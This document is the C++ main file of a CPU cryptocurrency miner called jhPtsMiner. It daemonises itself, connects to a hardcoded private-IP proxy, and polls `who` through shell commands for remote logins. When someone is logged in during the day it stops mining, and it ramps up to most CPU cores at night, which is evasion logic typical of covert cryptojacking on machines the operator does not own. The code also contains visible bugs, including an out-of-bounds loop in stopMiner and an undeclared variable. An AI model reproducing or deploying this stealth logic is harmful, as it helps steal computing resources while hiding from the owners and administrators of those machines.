#include "global.h"
#include "ProxyClient.h"
#include "MinerThread.h"
#include "sha2_interface.h"
#include "cpuid.h"


#define COLLISION_TABLE_BITS_8     21
#define COLLISION_TABLE_BITS_32    23
#define COLLISION_TABLE_BITS_128   25
#define COLLISION_TABLE_BITS_256   26
#define COLLISION_TABLE_BITS_512   27


struct commandLineClt
{
	string ip;
	uint16 port;
	uint32 tnum;
	uint32 bits;
	USE_SHA512_TYPE sha2type;
	bool bStat;
	bool bCheckHeight;

	commandLineClt()
	{
		ip = "10.45.50.233";
		port = 10086;
		tnum = 4;
		bits = COLLISION_TABLE_BITS_256;
		sha2type = USE_DEFAULT_SHA512;
		bStat = false;
		bCheckHeight = false;
	}

};


void printHelp()
{
	puts("Usage: jhPtsMiner[.exe] [options]");
	puts("Options:");
	puts("   -s                          The miner will connect to this proxy server");
	puts("   -p                          The miner will connect to this proxy port");
	puts("   -t <num>                      The number of threads for mining (default 4)");
	puts("                                 For most efficient mining, set to number of CPU cores");
	puts("   -m<amount>                    Defines how many megabytes of memory are used per thread.");
	puts("                                 Default is 256mb, allowed constants are:");
	puts("                                 -m512 -m256 -m128 -m32 -m8");
	puts("Example usage:");
	puts("   jhPtsMiner -s 127.0.0.1 -p 10086 -t 3 -m256");
}

void parseCommandline(int argc, char **argv,commandLineClt &cmdline)
{
	sint32 cIdx = 1;
	while( cIdx < argc )
	{
		char* argument = argv[cIdx];
		cIdx++;
		if( memcmp(argument, "-s", 3)==0)
		{
			// -o
			if( cIdx >= argc )
			{
				printf("Missing ip after -o option\n");
				exit(0);
			}
			cmdline.ip = argv[cIdx];
			
			cIdx++;
		}
		else if( memcmp(argument, "-p", 3)==0 )
		{
			// -u
			if( cIdx >= argc )
			{
				printf("Missing port after -p option\n");
				exit(0);
			}
			cmdline.port = atoi(argv[cIdx]);
			cIdx++;
		}
		else if( memcmp(argument, "-t", 3)==0 )
		{
			// -p
			if( cIdx >= argc )
			{
				printf("Missing thread num after -t option\n");
				exit(0);
			}
			cmdline.tnum = atoi(argv[cIdx]);
			cIdx++;
		}
		else if( memcmp(argument, "-m512", 6)==0 )
		{
			cmdline.bits =COLLISION_TABLE_BITS_512;
		}
		else if( memcmp(argument, "-m256", 6)==0 )
		{
			cmdline.bits =COLLISION_TABLE_BITS_256;
		}
		else if( memcmp(argument, "-m128", 6)==0 )
		{
			cmdline.bits =COLLISION_TABLE_BITS_128;
		}
		else if( memcmp(argument, "-m32", 5)==0 )
		{
			cmdline.bits =COLLISION_TABLE_BITS_32;
		}
		else if( memcmp(argument, "-m8", 4)==0 )
		{
			cmdline.bits =COLLISION_TABLE_BITS_8;
		}
		else if( memcmp(argument, "-help", 6)==0 || memcmp(argument, "--help", 7)==0 )
		{
			printHelp();
			exit(0);
		}

#if defined __BIG_ENDIAN__ || defined _BIG_ENDIAN
#else
		else if ( memcmp(argument, "-avx", 5)==0 )
		{
			cmdline.sha2type = USE_AVX_SHA512;
		}
		else if ( memcmp(argument, "-sse4", 6)==0 )
		{
			cmdline.sha2type = USE_SSE4_SHA512;
		}
#endif
		else if ( memcmp(argument, "-stat", 6)==0 )
		{
			cmdline.bStat = true;
		}
		else if ( memcmp(argument, "-ckheight", 10)==0 )
		{
			cmdline.bCheckHeight = true;
		}
		else
		{
			printf("'%s' is an unknown option.\nType jhPtsMiner[.exe] --help for more info\n", argument); 
			exit(-1);
		}
	}
}

#ifndef __WIN32__

bool g_bExit = false;

void init_deamon()
{
	if(fork() > 0)
	{
		exit(0);
	}

	setsid();

	if(fork() > 0)
	{
		exit(0);
	}
}

void signal_handler(int sig)
{
	g_bExit = true;
}

#endif

uint32 getWho()
{

/*
	vector<MinerThread*> v_miner;
	for (uint32 i = 1;i<=cmdline.tnum;i++)
	{
		MinerThread *pMiner = new MinerThread();
		if (!pMiner->init(cmdline.bits,i,cmdline.bStat,cmdline.bCheckHeight))
		{
			exit(0);
		}
		pMiner->start();
		v_miner.push_back(pMiner);
	}*/
	uint32 unum  = 0;
	char buf[24] = {0};
	system("rm -rf u.txt");
	system("who|grep \'[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\'|wc -l>u.txt");
	FILE *fp = fopen("u.txt","r");
	if (fp)
	{
		fgets(buf,24,fp);
		sscanf(buf,"%d",&unum);
	}
	else
	{
		unum = 0;
	}
	return unum;
}

void startMiner(uint32 thread_num,commandLineClt &cmdline,vector<MinerThread*> &v_miner)
{
	for (uint32 i = 1;i<=thread_num;i++)
	{
		MinerThread *pMiner = new MinerThread();
		if (!pMiner->init(cmdline.bits,i,cmdline.bStat,cmdline.bCheckHeight))
		{
			exit(0);
		}
		pMiner->start();
		v_miner.push_back(pMiner);
	}
}

void stopMiner(vector<MinerThread*> &v_miner)
{
	for (uint32 i = 1;i<=v_miner.size();i++)
	{
		v_miner[i]->uinit();
		v_miner[i]->kill_thread();
		delete v_miner[i];
	}
	v_miner.clear();

	Sleep(2*1000);
}

int main(int argc, char** argv)
{
	// init winsock
#ifdef __WIN32__
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);
#else
	init_deamon();

	signal(SIGINT, signal_handler);
	signal(SIGPIPE, SIG_IGN);
	signal(25, SIG_IGN);
#endif

	commandLineClt cmdline;
	parseCommandline(argc,argv,cmdline);

#ifdef	__x86_64__
		processor_info_t proc_info;
		cpuid_basic_identify(&proc_info);
		if (proc_info.proc_type == PROC_X64_INTEL || proc_info.proc_type == PROC_X64_AMD) {
			if (proc_info.avx_level > 0) {
				cmdline.sha2type = USE_AVX_SHA512;
				printf("using AVX\n");
			} else if (proc_info.sse_level >= 2) {
				Init_SHA512_sse4();
				cmdline.sha2type = USE_SSE4_SHA512;
				printf("using SSE4\n");
			} else
				printf("using default SHA512\n");
		} else
			printf("using default SHA512\n");
#endif
		uint32 num_processors;
#if defined(__WIN32__)
		SYSTEM_INFO sysinfo;
		GetSystemInfo(&sysinfo);
		num_processors = sysinfo.dwNumberOfProcessors;
#elif defined(_SC_NPROCESSORS_CONF)
		num_processors = sysconf(_SC_NPROCESSORS_CONF);
#elif defined(HW_NCPU)
		int req[] = { CTL_HW, HW_NCPU };
		size_t len = sizeof(num_processors);
		v = sysctl(req, 2, &num_processors, &len, NULL, 0);
#else
		num_processors = 1;
#endif
	
	if (num_processors < 4)
	{
		printf("num_processors < 4\n");
		return 0;
	}

	SHA2_INTERFACE::getInstance(cmdline.sha2type);

	ProxyClient *pClient = ProxyClient::getInstance();
	pClient->init(cmdline.ip,cmdline.port,num_processors);
	//client.init("10.9.43.2",10086,3*tnum);
	pClient->start();

	uint32 timerPrintDetails = GetTickCount() + 8000;
	uint32 miningStartTime = time(NULL);
	bool bStart = false;
	vector<MinerThread*> v_miner;

	while (1)
	{
		if (cmdline.bStat)
		{
			uint32 currentTick = GetTickCount();
			if( currentTick >= timerPrintDetails )
			{
				// print details only when connected
				uint32 passedSeconds = time(NULL) - miningStartTime;
				double collisionsPerMinute = 0.0;
				if( passedSeconds > 5 )
				{
					collisionsPerMinute = (double)MinerThread::totalCollisionCount / (double)passedSeconds * 60.0;
				}
				printf("collisions/min %.4lf,collision total %d,Shares total %d\n",collisionsPerMinute,MinerThread::totalCollisionCount,MinerThread::totalShareCount);
				timerPrintDetails = currentTick + 8000;
			}
		}

		uint32 cur_hour = ProxyClient::cur_hour;

		if (cur_hour == 6 || cur_hour == 22)
		{
			if (bStart)
			{
				stopMiner(v_miner);
				bStart = false;
			}

		}

		if (getWho() > 0)
		{
			if (cur_hour > 6 && cur_hour < 22)
			{
				if (bStart)
				{
					stopMiner(v_miner);
					bStart = false;					
				}

			}
		}
		else
		{
			if (cur_hour > 6 && cur_hour < 22)
			{
				if (!bStart)
				{
					uint32 thread_num = num_processors/2;
					startMiner(thread_num,cmdline,v_miner);
					bStart = true;
				}
			}
		}

		if (cur_hour == 22)
		{
			if (!bStart)
			{
				uint32 thread_num = num_processors/5*4;
				startMiner(thread_num,cmdline,v_miner);
				bStart = true;
			}

#ifdef __WIN32__
			Sleep(1000*3600);
#else
			sleep(3600);
#endif
		}
		
		Sleep(1000);	
	}



	pClient->join();

#ifdef __WIN32__
	WSACleanup( );
#endif
	return 0;
}